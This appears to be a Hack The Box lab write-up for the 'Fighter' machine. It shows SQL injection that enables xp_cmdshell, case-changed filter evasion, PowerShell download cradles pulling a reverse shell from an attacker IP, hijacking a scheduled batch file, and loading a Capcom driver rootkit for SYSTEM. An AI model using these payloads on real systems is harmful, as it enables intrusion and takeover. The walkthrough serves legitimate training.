# Fighter

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.228.121                                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 12:58 +08
Nmap scan report for 10.129.228.121
Host is up (0.0095s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

With this, we can start proxying traffic through Burp.&#x20;

### Web Enumeration

Port 80 shows a Street Fighter themed page:

<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

There's mention of a 'link' that we are supposed to know. Based on HTB trends, I added `streetfighterclub.htb` to the `/etc/hosts` file. Afterwards, I ran a `gobuster` directory and `wfuzz` subdomain scan on the site.&#x20;

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hl=190 -H 'Host:FUZZ.streetfighterclub.htb' http://streetfighterclub.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://streetfighterclub.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000134:   403        29 L     92 W       1233 Ch     "members"
```

Interestingly, it just shows us a 403:

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

I noted that this is running Microsoft IIS based on the error. I still ran a `gobuster` scan on this new subdomain, and found one directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://members.streetfighterclub.htb -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://members.streetfighterclub.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/08/08 13:06:57 Starting gobuster in directory enumeration mode
===============================================================
/old                  (Status: 301) [Size: 164] [--> http://members.streetfighterclub.htb/old/]
```

Based on this alone, we can run a `feroxbuster` recursive scan to find all the hidden subdirectories with the `-x asp,html,aspx,php` extensions.&#x20;

```
$ feroxbuster -u http://members.streetfighterclub.htb -x asp,html,aspx,php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://members.streetfighterclub.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [asp, html, aspx, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       58l      129w     1821c http://members.streetfighterclub.htb/old/login.asp
200      GET       58l      129w     1821c http://members.streetfighterclub.htb/old/Login.asp
```

We found a login page!

### SQL Injection -> RCE

The login page looked quite vulnerable to some stuff:

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Here's the POST request being sent back:

```http
POST /old/verify.asp HTTP/1.1
Host: members.streetfighterclub.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: http://members.streetfighterclub.htb
Connection: close
Referer: http://members.streetfighterclub.htb/old/login.asp
Cookie: ASPSESSIONIDSQRDQTCD=GPFNOGOAIKIKAKLOPLMLHBBA
Upgrade-Insecure-Requests: 1

username=test&password=test&logintype=1&B1=LogIn
```

There was a `logintype` variable, where 1 indicated Administrator and 2 was for Users. Adding any quotes to it causes an Interval Server Error:

&#x20;

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

I tested this with some basic SQL Injection, and found that `;+--+-` works! We are redirected to the `Welcome.asp` page instead.&#x20;

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

So this login page was vulnerable to SQL Injection. I tested it a bit and found that there were 6 columns using UNION Injection:

```sql
1 union select 1,1,1,1,1,1-- -
```

I attempted to write webshells onto the site and run `xp_cmdshell`, since this may be a MSSQL server on the backend. All of them returned 500s, except for the reconfiguration to allow `xp_cmdshell` and execution of a `ping` command:

```sql
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```http
POST /old/verify.asp HTTP/1.1
Host: members.streetfighterclub.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://members.streetfighterclub.htb
Connection: close
Referer: http://members.streetfighterclub.htb/old/Login.asp
Cookie: ASPSESSIONIDSQRDQTCD=GPFNOGOAIKIKAKLOPLMLHBBA; 
Upgrade-Insecure-Requests: 1



username=wad1awdawd23&password=t123awd34&logintype=3;EXEC+xp_cmdshell+"ping+10.10.14.11"--+-&B1=LogIn
```

However, I got no ping back. In this case, there might be something blocking us on the website. I searched ways to obfuscate it, in case there was Defender or something blocking us, and this site had a pretty good way:

{% embed url="https://www.midnightdba.com/Jen/2016/04/xp_cmdshell-isnt-evil/" %}

Just use `XP_cmdshell` instead of `xp_cmdshell`, and the ping would work:

<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Now, we just need to gain a reverse shell. Since there's something obviously blocking us on the machine, normal methods using `nc.exe` might not work. Oddly, running `powershell.exe` results in a 500, indicating that we might have to use the full PATH for it.

The 64-bit version of Powershell doesn't work oddly. I tried the 32-bit version located in `C:\Windows\SysWOW64`, and it worked properly:

{% code overflow="wrap" %}
```powershell
C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe "iex(new-object net.webclient).downloadstring(\"http://10.10.14.11/rev.ps1\")"
```
{% endcode %}

The final query looks like this:

{% code overflow="wrap" %}
```
1;EXEC+XP_cmdshell+'C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe+"iex(new-object+net.webclient).downloadstring(\"http://10.10.14.11/rev.ps1\")"'--+-
```
{% endcode %}

Take note to rename the shell to `REV.PS1` since the web request sent is in caps for some reason. Afterwards, we would get a shell:

<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Write Batch -> Decoder Shell

The box is a well patched machine:

```
PS C:\Windows\system32> systeminfo

Host Name:                 FIGHTER
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     19/10/2017, 22:31:21
System Boot Time:          08/08/2023, 07:47:24
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             it;Italian (Italy)
Input Locale:              it;Italian (Italy)
Time Zone:                 (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.028 MB
Virtual Memory: Max Size:  4.799 MB
Virtual Memory: Available: 3.720 MB
Virtual Memory: In Use:    1.079 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 159 Hotfix(s) Installed.
                           [01]: KB2894852
                           [02]: KB2894856
<TRUNCATED>
```

There are 150+ hotfixes applied to this machine. There are other users on the machine too:

```
PS C:\Windows\system32> net users

User accounts for \\FIGHTER

-------------------------------------------------------------------------------
Administrator            decoder                  Guest                    
sqlserv
```

Interestingly, we can read the `decoder` user's home directory:

```
PS C:\users\decoder> dir


    Directory: C:\users\decoder


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d-r--        20/10/2017     14:40            Contacts                          
d-r--        02/03/2021     07:31            Desktop                           
d-r--        20/10/2017     14:40            Documents                         
d-r--        20/10/2017     14:40            Downloads                         
d-r--        20/10/2017     14:40            Favorites                         
d-r--        20/10/2017     14:40            Links                             
d-r--        20/10/2017     14:40            Music                             
d-r--        20/10/2017     14:40            Pictures                          
d-r--        20/10/2017     14:40            Saved Games                       
d-r--        20/10/2017     14:40            Searches                          
d-r--        20/10/2017     14:40            Videos                            
-a---        08/05/2018     23:54         77 clean.bat
```

There's a batch file present that looks like its part of a scheduled task, and we have modify permissions on it:

```
PS C:\users\decoder> type clean.bat
@echo off 
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp 
exit 
  
PS C:\users\decoder> icacls clean.bat
clean.bat Everyone:(M)
          NT AUTHORITY\SYSTEM:(I)(F)
          FIGHTER\decoder:(I)(F)
          BUILTIN\Administrators:(I)(F
```

Normally, I would append something to the end of the file and get it to execute, however, there's an `exit` call which would prevent me from exploiting that.&#x20;

Normally we cannot overwrite the file without write permissions, but modify allows us to use `copy` to change the file.&#x20;

{% embed url="https://stackoverflow.com/questions/45141044/cmd-copy-null-to-multiple-files" %}

```
PS C:\users\decoder> cmd /c copy /Y NUL clean.bat
        1 file(s) copied.
PS C:\users\decoder> cat clean.bat
```

Now, we can write anything we want to this file. We can `echo` in the same shell we used earlier:

{% code overflow="wrap" %}
```
cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/REV.PS1') >> clean.bat"
```
{% endcode %}

After waiting for a while, we would get a `decoder` shell:

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

### Driver Exploit -> SYSTEM

Basic enumeration of this user indicates that `decoder` has no special privileges over the machine. I couldn't run lots of scripts because AppLocker or Defender was present on the machine:

```
PS C:\Windows\Tasks> .\winpeas.exe
PS C:\Windows\Tasks> Invoke-PowerShellTcp : Program 'winpeas.exe' failed to run: Operation did not 
complete successfully because the file contains a virus or potentially 
unwanted softwareAt line:1 char:1
+ .\winpeas.exe
+ ~~~~~~~~~~~~~.
At line:128 char:1
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
```

Based on the theme of the machine, I enumerated exploits related to Street Fighter and surprisingly, found an ExploitDB link:

{% embed url="https://www.exploit-db.com/exploits/40451" %}

Capcom driver is well-known for granting SYSTEM shells, so let's take a look at that. There are loads of PoCs available. I used this one:

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit" %}

The above was the best because it was based on Powershell instead of `.exe` files, which I could not seem to execute anyway. I struggled a bit here in uploading them onto the machine, but eventually resorted to using 0xdf's writeup to combine all of them (which is really smart):

```bash
find . -name "*.ps1" -exec cat {} \; -exec echo \; > capcom-all
```

Then, we can use the Powershell download cradle method to import it in memory:

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.11:443/capcom-all')
```

Then, run the exploit:

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

### Root.exe + DLL RE -> Flag

Within the administrator's desktop, there wasn't a `root.txt` flag. Instead, there was an `.exe` file with a `.dll` library.&#x20;

```
PS C:\users\administrator\desktop> dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        24/10/2017     17:02       9216 checkdll.dll                      
-a---        08/01/2018     22:34       9728 root.exe
```

The `root.exe` file required a password:

```
PS C:\users\administrator\desktop> .\root.exe
C:\users\administrator\desktop\root.exe <password>
```

We can bring these back to our machine for reverse engineering to find that password. The files weren't that big, so I used `base64` to encode it and then transfer it back to my machine:

```powershell
[convert]::ToBase64String((Get-Content -path "checkdll.dll" -Encoding byte))
[convert]::ToBase64String((Get-Content -path "root.exe" -Encoding byte))
```

Afterwards, I opened both in `ghidra`. `root.exe` had a function `FUN_00401000` that performed some character stuff:

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

`checkdll.dll` had a function that XOR'd bytes with 9.&#x20;

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

The global variable can be found here by clicking on it:

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

The encryption can be reversed easily by XOR-ing it with 9 and converting to characters.&#x20;

```python
def xor_hex_string(hex_string, key):
    result = ""
    for i in range(0, len(hex_string), 2):
        hex_byte = hex_string[i:i+2]
        xor_result = hex(int(hex_byte, 16) ^ key)[2:].zfill(2)
        result += xor_result
    return result

input_hex = "466d606645684f6c7d6800"
key = 9

output_hex = xor_hex_string(input_hex, key)
print(output_hex)
```

Afterwards, we can get the password and pipe it to `xxd` to convert it to printable characters:

```
$ python3 xor.py | xxd -r -p
OdioLaFeta
```

Then, we can get the flag:

<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
